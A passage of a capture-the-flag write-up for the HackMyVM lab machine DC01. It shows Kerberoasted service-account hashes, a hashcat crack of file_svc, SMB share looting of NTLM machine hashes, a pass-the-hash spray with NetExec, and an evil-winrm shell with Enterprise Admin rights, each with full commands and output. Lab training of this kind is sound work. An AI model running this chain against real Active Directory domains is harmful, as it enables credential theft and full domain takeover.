$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$559aaf1648e1f4f4094b5d5b00ce9ada$449984af1fd5ef67e4d2d333b0572534a6c3248314f2b7392e78f3a7efdc9f1a6b924683546ff37e7c4cdb3f7603d4dd79bdbc8732d145f0430e0cd526affa341ef73c0403603e07941dab46857f65d3d531aa2dbefee076f2408b3f321c2ae751b63ca37cc87cf93c01ad5d733526902de99662514960d6c3d0f1c8fe2c9e296acffbbc675ecbfaf83bcd878b5f39ffa63f0f1ae8fe443eeb3793ec03f5f075eacb709d7c0dce0ecdd76974a18dba20db068c8465131c74f3730ec664bee66faba104160c6c1db5c597e9df3fff57557484098a5b9255d23be042226088ca29525dc67c457da20d1f9b17d0836c7af3385b51e7b999114ccf99cbaa60df4a88d7ee60f7a95ab207b33259dc09173f979dee874c0e8dea427e58b61b3512498cb51a59eea66d0b01eaef5819e5c4158803eddcf9d9c51e365ef8f835d6471074239eaab58011b63fb25c80baf488c2ff631b4fb3ccd41fcb72c4a90208d761cb3974825c4a7fc8ee94232c1217fba37fdc8ef5536c78596bfac3c1e2a7ae19c9cc8f253c049f475c5ee85b311f89dcde5222b2d70c9e1dcf71c4b4ee90e0c244947db5c587a4103906d185edf22d9986730372b5dfe4f69171bf43265146c022cf3b9c88b41d91c93888ae397d090afbcd0b3c3c1deb901e7b5e9f198ba1d7fa51ab4ffd5154b9888e86c3f873037e1e8bfb991a1903a77957af2da6752094449c80da6eff2d3bee2de803768e0377e1f0cd9f244947bb7238ec0d8488d2056245cd93f909091ccbf0af5074e00533ec06e7e2bcdd4eb4ade4c7878714cc0d4b87736231609ac7db96e121f6b10b5f45dc869e2f2603b6d09e9c294802824063713373ec9d8442afe73db7c71c6e66bc57ad383882823ca7f5b207b24f3d57d6a7501d6348fd13e5e5b0c8b33cf07da4aada363c37076baa375df1e92284e43832dfc4c866cb9cd394ef2346d08cc12145080976477c5457e0c2e75cc0a58e9989abf3cd55183fffd8e257abcf38d2b56e9787eeb8b33343721baf33050996c6d80d1ee8e8a3c1970a1a562b55e344b2612f06d3f15185c68f32e536b5ad55774b860d04acc0c899b4c2de71271047699232b27e2a1538d8135b71b74bf0be04c40f116b78804fbb9393377ed7e936c6419da5b48a9b0bab44fdd34c1b6653639b3a913214634d6d93b91239a64f504c513fafe212a89728cfe40a64aca0c1788d341d6ae5c92a7aca00f37a00af609cfa7f9bdc776d3a4004b3709c4eb9d3d3f79bf545bbd00ed8dc450417ad5fa11daa047a9dbe2d423af92672498ed8ec07274dc0b643b8ec165057516a5c7cebe14cc26f07b62fdd6d0a8a9539909c018953d5949ccecf5a61be6c53ff7c08d888bff580d095587dd86a21aede54eeb37224a0bc1ff5d1adcf595bd88c6a471784aae513437ff4eedc5c5722199d24fa6777a8d6a8b5d1f8f418f797875f8bd77d86167faeddb2672325995cb8346fb5292a
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$e5ddc71702af41f21dc9a0b05ae598b7$6c1cb49e6a69c5648441a49ffa07a4dfb043b2743f28894230c7802ab0790724e7bdf17143e87d0d722868f0a78f8150353921b885af15bd78cec8bc9085edafcd1afad879e49210a5a6921971304f4e2f7e969d9aa46cb6138e55eee9cfcd31c050ffe6aa018aeb8f97fff03d77aaaae05a6fa54e39eb172fc331a361f3b7c844d91a2550b39f7a09f11bbded30671eb47b40feca950e0a094ded14f9d8715bffed9f976d0408f89d1d01e7fe4779a73a569f54c3cabfacd59f3438ec2421122ba86476c7d7645f35f91b67aa1aec47ab15c46c76983997f377782982eaf8c85750bd77f66fbd651ea257abf531dcf1d941b8fc86b1734fbd9cd02725a704d79b349517796a26903fff4488630649106e65e9f525597e2d359ae7639b0e046d5e34e60cdbd20bcb990123db2f8612bd0dfb23b20c3fff86af966109be3f2bf5037cfa9e47ece582ec14db35e3a9254973517dcbcdbba5fed6921f9bbaa2740c6dfa34298faa20c7728cba95c5cd02a6478298387f5c262098fbc31c8f50ac724e19520779055199e2d0a9efdce098fbc6a6958251807aec0ff50b5db770fc0854bbe6c528e16ddb5d5c83b4b5e7a750c7795af68c9a596512974b2cbea7b9888889e20349f2e62cc4eddbf9ab3c39025ff1d994a90f923a6a58cb37b64f6e492903b3fda33fbea6af8750d445ae1a473c2f2576e6b72446828d38c04132fb5cd6d2f9cb2435865c4a1ef3e4993f65be49ab1d78f0290288f780070f0ed7d2518d04c305eddb321d36d99ad03b0b03d2479599c8a5f6e68c6ff0f7c7db50520dda747339c2fc06e43b46f62ed2f069b2ae968fe315c6c5469263dec2c709dcb7a290e279c38fe671af3df1e544509c012e24ef68018a751e5548e30cf55e7a4c0e7abe83b9087307ec78152965ef468b1f0e3b1ea386f4aedf664a9b0e7b18f5a584f0ee5f5874a5078270d219a0205ed73b4ef808677852b30b59f9b1ab2c8826522259c247d382af5c5c2d541f453073b9637748dfbd9c1dca689ac71dafc8d55c4e1cf136036f3cdfa3766948ed36789b47de8628f9d59e0bcf9b5a6b6d6ed3a607eaddb99ede339d018c93857c9d4d99d8d6811325c3fee0092f6c40760ec79c81e1aaf289c0dd348e2d18108013380c1e837a1e545e1a216e74995bde20dafa45fe357185f3766cf21852bd5a3443d6ba7a8febf88d6492f7c5075427a31a838af13f1d47bddd60e74dded3fbebbe029696faeb72c5869a00a9505eaed3a3a16c4c268144efbf5f08ce44e12a766235ae82010ff6005141ebc36db5f635d753a4506247c357da76e66e7201e5925f705a59fe35f75344a7af886aa1f7af8d6dc9f54efe9b0065e19484a8f7733a3764482da01cf75f2ca6f6c619b143c52802336630f4b7cb9fa50abb1abe211c9e1ca5ab9f57e71a7bc53c41d5f52adbe856a9a6ac48ef0523ab6533b7d383365e183d01cda697d837d954da06d27c7f68
$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$1289dc54b758eff8154aa1b1bd30fe32$415f197e1c948db778be993952cd52acdd299ece6eb54f14eb4c66a26a71d2638122eaafdfb7df9010640a92378b2a4073c9179524ac21db0ee78b93403b61e8bcf57782f0c8f10910431c07ed44653958a09d3382ffc9c2820f2355e35d861526146c27311f2c22d9b4b41cf6a48cefedf9e092f50a146537cd7c0e33fbcca4f4edf86763b7e1df64ae28ab3a43699bad63379fd6a543bb42d3e20db4b6c1ebb039f49848eb624bb510a5da12a4aec761921dbd69cec7d48c27aae50899d203652a2e0f6c770fa0cc5926e9509fc567189dfb0c489dd7beaa20348c19b908f3ce6135d98e84e3b542f7813ef67748fe1ad2c1ebed4591598675b0d6fad3fc3e1bdf860ebc007a878f22be82e4896b2c809e30c5a29981a152b61a3d18cf00c98f1d29451f47d12c46db4b75488e2cfa72fec4173170b1bba87218ba33c7540d1007680a1970f7cca02ed3ef91a6c0357698072151c61e461084574fa128b1df61f13d09b62ba00a2a76185b8da2b39d2dceeed61f6e699228e146ff1ad6691edeeded0af088df23c556574abf6876d464e72d90cbcac56cda5b26cf2b59dcce7d0fbe09b78e25106b0275239a9834b6396b0fb8dbc3e69ec4464a7095efef18e999d4ecd9a22c87f2504407562f2bf30b50158a54c55e6d832678c199cd8fac39c09bf00f07b9eb0f3f6992fe3895ed85196d343bae7333b6f2137a8e2bee54ee2f89161d50e9f6de2652fcc475d0bd5fd43b3e0cb12c61424057a6e798c63739807722860e116a3414c5b88c429ef3c60d5c8e609242bb97e5dd49f4135f0695cf2086a0cf8b251e1db2cfb6b2a47efcead0cc6a0ca2db1ca8995cff61f93e717174b98d8ba50e1b2d8dcf595861f898a01a6680ca09010d7d811e2495665d65f3ca10a23931339e718bea89d995a11e1bd643a196f48e532737359ff4a081a71dc5479fee6e9c22e435ac9a147f1a708749736f5a641c45166a4e52c07596b7e76567252e8c33757238f1eaa9e2fce3938d24747a279c69327e420133d8ef14546aecc1dcfed0de23276024dff99c0f1073d847995ba5a9d44c2b4f3ab4e3759c9baf3bd8774008fd8494276158d4ca1068eab5179aa2a3e69d03a68895c052486c3fdaca3afced56d4608486c4aa69a2e8a66310a3225a195c8609f6d1aa8dd41c9377f2dd0470d2f86054e84ac06f91eccbc688655ba5eeb43ec86bb248c2a14f31818a332d056adc27511499ba49000977b6fa12d5914c59d42e4ae18da126d8739aff59ce1e0d2814a29eed367b2a8995227af030316d5700741bb75477e90f4f0e09c9bd7fa5b5844298a5b2baadf73f95ce94a2c6f79bd794e4c4540f8352fea4f2a9aae35ba561d79359e95ecf80a2af8a68a79489ed935e49fec2defd02a548064ec0d9b9367bbb95855658da786c828e899e511d7061ab2b17774efc23f1051495fe09a20ed4c8b6a979b417f40977c316cec1605cd3a713b48012
```
The output file now contains the raw, valid krb5tgs hashes for multiple critical service accounts, including:
- file_svc 
- firewall_svc
- backup_svc
- web_svc
These hashes can now be handed over to Hashcat for offline password cracking.

With our target TGS tickets exported into `kerberoast_hashes.txt`, we can move forward with an offline dictionary attack using hashcat. We select mode `-m 13100` (Kerberos 5, etype 23, TGS-REP) and use the standard `rockyou.txt` wordlist to crack the captured service account hashes.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ hashcat -a 0 -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 5 225U, 6974/13948 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 5 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (13775 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$aee6ac5c324d3a59a6f4dff81ce87adf$e94659e484a7fee3e1c6f5ca03b407a6376a29ef9c008a55f69304210074c3b9a4a221c35f7a764206ed62892d68cbff3cc24fb2c375740a3774145fbb3cc1019d3851ab774460e83a9627d778c9bae0b51fc7d4ca8af129bfe84bcd075430a08932492d500421326b0c8b67a2d0c567b2b2b0e7e77a5f0ca18ef4ab47da02616588c72afeabed875939fd13fa4e1e135a09d5becbd503bfb3a0f02ca2c6b8a0296f64b2b73ec1cfa6bea5459e384de4ca1b47e8af1db25fc02c4831c749e960404f76e46610d2a80e0f7443158801d266b78ed2221c7f473743b6c49df27df61c3a8cd70a8fab31086cb194a2232d7b48f0e714590038fa2bdd75d3a96d1fc4bc29db59793cad0a0d0a83225512aab617d0ce5278497a173aa244cf553617b9245094547ceb44f6cb07d362bcdaaa8728cbc96bd5ca3a7dd9f1baeb6bb904e5ff18c62e28b9a125e25d838b277d615a8438366f3aadc0b470577621860917d562b7193ad41a75ca4a5af4065e0e9551c4ac01aa8d5018a4f01467f7471553f0e627655579a5620fe5e923dd004cfded59604cf87eefbb413b7a0731769f6bd9dbfc2bc1a429b0ec4246f8b1a4e9e9179b7b01e31b89bef1af1b5b3a0f48d509214d1abea7ea5f350a6bd1ed12bdf3722832d77df0f1d8d8e91dc58e5604fbff0968b94ba7e12cbf711a75307fc6286ec1c226f71b40f463261df9dade442632793d4b6afdfa623d69a37f77b307caf847250eed6962ca804a23d30c528559ed6a8ff2958972e86b6da8fba1dace446424df813ed620fd41b34bbac21976f3995c8a7d3fe23cb1165b9aa3b5ac78e75fef6a4cff075ae0fb1e9978265df30b235cc5a137a9a31e2e9f78cd08cdbec45011e34bf2f9394dd156cab26d314b8e85bb0a654aaf14ddce53a4fc086124366f5701563d47bf9c2c8761bbb125ed0b7b19079c2597ee0dfe7731d5ee40bf35e121c5ecaf80e407e851038540f647af1dcd919c2240590e011688e09c1df8a1197f9c3fd30e8abc259a07a3e07bc2823a77de490084b21259bd946470e0330176ba3547eceabcb75ee2c2b6bf6dc0ec189e0f35c32d0706cd52bd3993068332ce0430c6be9cc0a128f49f4da47ed01afec89c3e9227d9b288dfe07dc944cae4d7d1b21d5ee185a1e9a3f4f1bc1d7f067269fdeb5117b24c138310ef54513295f28426f8219ed99d5d90e32042468bc2e37003de670eeb4f517f01857177330764179f301267da6d8a3fa40d8a44315515273d7a1b6c473b27806b0ddba07c0056f793d69fe0527ae2d8137123160fd1710c7564c60fbcb1a8de0f5a1e3a0a387a281c9c1a1222f8de0384a9c86d6e47871cb33f94a67799c6c9fd0091db48935fd8881ec242050e485a44324008735ec4e7f9782c240acb7cc664940dd174cb259cb694a0d771aad855a7e0d964dd7ea4036d2c5b0c5ecff67c20119d17b0bc3c4914ff85f0b44c8030fdebfff2f861464f:Password123!!
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: kerberoast_hashes.txt
Time.Started.....: Wed Aug  5 09:22:58 2026 (1 min, 7 secs)
Time.Estimated...: Wed Aug  5 09:24:05 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   971.9 kH/s (3.18ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/5 (20.00%) Digests (total), 1/5 (20.00%) Digests (new), 1/5 (20.00%) Salts
Progress.........: 71721925/71721925 (100.00%)
Rejected.........: 0/71721925 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:4 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 34%

Started: Wed Aug  5 09:22:34 2026
Stopped: Wed Aug  5 09:24:06 2026

```
The dictionary attack finishes successfully and reveals the cleartext password for one of our targeted accounts. The hash belonging to file_svc is cracked, yielding the valid credentials: `file_svc:Password123!!`.

Now that we have cracked a valid set of credentials for the domain service account `file_svc`, we can use NetExec to map out its available network share permissions.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'file_svc' -p 'Password123!!' --shares
SMB         10.0.2.10       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.10       445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.0.2.10       445    DC01             [*] Enumerated shares
SMB         10.0.2.10       445    DC01             Share           Permissions     Remark
SMB         10.0.2.10       445    DC01             -----           -----------     ------
SMB         10.0.2.10       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.10       445    DC01             backup          READ            
SMB         10.0.2.10       445    DC01             C$                              Default share
SMB         10.0.2.10       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.10       445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.2.10       445    DC01             SYSVOL          READ            Logon server share 
SMB         10.0.2.10       445    DC01             Users     
```
The output confirms our cracked password is valid (`[+]`) and reveals that file_svc has explicit `READ` permissions over a non standard network share named backup. We can connect to this directory using `smbclient` to examine its contents.

```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ smbclient //10.0.2.10/backup -U SOUPEDECODE.LOCAL/file_svc%'Password123!!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 19:41:17 2024
  ..                                 DR        0  Mon Jun 17 19:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 10:41:05 2024

                12942591 blocks of size 4096. 10855878 blocks available
smb: \> get backup_extract.txt
getting file \backup_extract.txt of size 892 as backup_extract.txt (7.0 KiloBytes/sec) (average 7.0 KiloBytes/sec)
smb: \> exit
```
Inside the share, we find a text file named `backup_extract.txt`. We pull it down to our local machine and inspect its contents using `cat`.
```bash                                                                                             
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ cat backup_extract.txt                        
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```
The loot file contains a raw NTDS or SAM database dump. This exposes the unsalted NTLM password hashes for ten different infrastructure computer accounts on the network (`WebServer$`, `DatabaseServer$`, etc.). Since these are active machine credentials, we can format them to attempt a domain wide Pass the Hash (PtH) attack.

To efficiently use these credentials in an automated attack, we need to separate the raw dump into individual targeting arrays. We can use awk to split each entry by its colon delimiter, parsing the raw usernames (including their trailing machine identifiers) into a user list and their corresponding NTLM hashes into a standalone hash list.

The awk utility processes the file line by line using a specific structure to split and route the data fields:
- `-F':'`: This defines the field separator as a colon (:), instructing awk to treat each data point between the colons as a distinct field variables ($1, $2, $3, etc.).
- `print $1 > "user-spray.txt"`: This extracts the very first field (the raw machine account username) and writes it directly to the user-spray.txt file.
- `print $4 > "hashes-spray.txt"`: This targets the fourth field on the line, which contains the unsalted NTLM/NT password hash string, and isolates it into hashes-spray.txt.

```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ awk -F':' '{print $1 > "user-spray.txt"; print $4 > "hashes-spray.txt"}' backup_extract.txt
                         
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ cat hashes-spray.txt
c47b45f5d4df5a494bd19f13e14f7902
406b424c7b483a42458bf6f545c936f7
48fc7eca9af236d7849273990f6c5117
e41da7e79a4c76dbd9cf79d1cb325559
46a4655f18def136b3bfab7b0b4e70e3
46a4655f18def136b3bfab7b0b4e70e3
8cd90ac6cba6dde9d8038b068c17e9f5
b8a38c432ac59ed00b2a373f4f050d28
4e3f0bb3e5b6e3e662611b1a87988881
48fc7eca9af236d7849273990f6c5117
                          
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ cat user-spray.txt 
WebServer$
DatabaseServer$
CitrixServer$
FileServer$
MailServer$
BackupServer$
ApplicationServer$
PrintServer$
ProxyServer$
MonitoringServer$

```
The parsing utility structures the items into two perfectly matching index lists. Because the lines correlate directly, we can supply both files directly to our attack tools to fire a synchronized Pass the Hash credential spray over the network.

With our clean target arrays created, we can fire a synchronized Pass the Hash credential spray against the Domain Controller using NetExec. We supply our username file with `-u` and our matching NTLM hashes with `--hash`. By pairing this with `--no-bruteforce`, NetExec maps the items line-by-line rather than trying every combination. We append `--continue-on-success` to ensure the tool completes the full scope regardless of any successful logins.

```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u user-spray.txt --hash hashes-spray.txt --no-bruteforce --continue-on-success 
SMB         10.0.2.10       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\MailServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\BackupServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\ApplicationServer$:8cd90ac6cba6dde9d8038b068c17e9f5 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\PrintServer$:b8a38c432ac59ed00b2a373f4f050d28 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\ProxyServer$:4e3f0bb3e5b6e3e662611b1a87988881 STATUS_LOGON_FAILURE 
SMB         10.0.2.10       445    DC01             [-] SOUPEDECODE.LOCAL\MonitoringServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE 

```
The spray achieves full success on the fourth attempt. While most computer accounts return `STATUS_LOGON_FAILURE`, the credentials for `FileServer$` hit perfectly `[+]`. Furthermore, NetExec appends the crucial (`Pwn3d!`) tag to the output. This indicator confirms that the `FileServer$` identity possesses local administrative rights over the Domain Controller machine (DC01), giving us immediate execution capabilities on the system.

## Privilege escalation

### Pass the Hash (PtH) via Evil-WinRM
Our previous NetExec spray demonstrated that the `FileServer$` machine account holds administrative rights on the Domain Controller. Leveraging port 5985, we use evil-winrm to authenticate directly with the account's NTLM hash, bypassing the need for a cleartext password.
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ evil-winrm -i DC01.SOUPEDECODE.LOCAL -u 'FileServer$' -H e41da7e79a4c76dbd9cf79d1cb325559                     
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
Evil-WinRM* PS C:\Users\FileServer$\Documents> whoami /all

USER INFORMATION
----------------

User Name               SID
======================= ============================================
soupedecode\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
SOUPEDECODE\Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\FileServer$\Documents> 

```
The successful evil-winrm connection provides an interactive PowerShell prompt. Running whoami /all reveals a severe misconfiguration: the `FileServer$` machine account is nested within the `BUILTIN\Administrators` and `SOUPEDECODE\Enterprise Admins groups`.
Our inherited token grants critical privileges, including `SeDebugPrivilege`, `SeBackup/RestorePrivilege`, and `SeImpersonatePrivilege`. Possessing an Enterprise Admin token on a Domain Controller gives us total, unconstrained control over the entire Active Directory forest.

With our interactive shell, we have complete read and write access across the entire server file structure. We chain our final verification commands together to confirm our identity, inspect the network configuration, and extract both the user and root flags simultaneously.
```bash
*Evil-WinRM* PS C:\Users\FileServer$\Documents> whoami;hostname;ipconfig;type c:\users\administrator\desktop\root.txt;type c:\users\ybob317\desktop\user.txt
soupedecode\fileserver$
DC01

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::2ce6:ec6d:fb6:dce8%4
   IPv4 Address. . . . . . . . . . . : 10.0.2.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1
HERE IS THE ROOT FLAG
HERE IS THE USER FLAG
*Evil-WinRM* PS C:\Users\FileServer$\Documents> 
```
The output confirms our continuous administrative access on DC01 at IP address 10.0.2.10. Both root.txt and user.txt are successfully read from their respective administrative desktops, completing the machine compromise.

## Conclusion & final thoughts
DC01 on HackMyVM provided an exceptional, realistic showcase of how minor misconfigurations can chain together into a full Active Directory compromise. Starting from nothing, we utilized an open guest session to enumerate domain identities, leveraged those low privileged credentials to run a Kerberoasting attack, and ultimately uncovered an insecure backup log containing computer account hashes. The critical turning point was identifying that the `FileServer$` identity was mistakenly nested inside the Enterprise Admins group, allowing us to use a Pass the Hash attack via Evil-WinRM to claim total domain dominance. This box perfectly underscores the importance of the principle of least privilege, strict auditing of computer account group memberships, and securing sensitive backup repositories.

## Lab environment cleanup
Once you finish compromising a target machine in your lab, it is vital practice to restore your attacking platform back to its standard operational state. Since we had to aggressively freeze our local time parameters to bypass the Kerberos clock skew restrictions earlier, we must restart our background hypervisor utilities and re-enable automated network time synchronization. Run these commands to bring your Kali machine smoothly back into the present:
```bash
┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ sudo systemctl start virtualbox-guest-utils

┌──(emvee㉿kali)-[~/Documents/DC01]
└─$ sudo timedatectl set-ntp true
```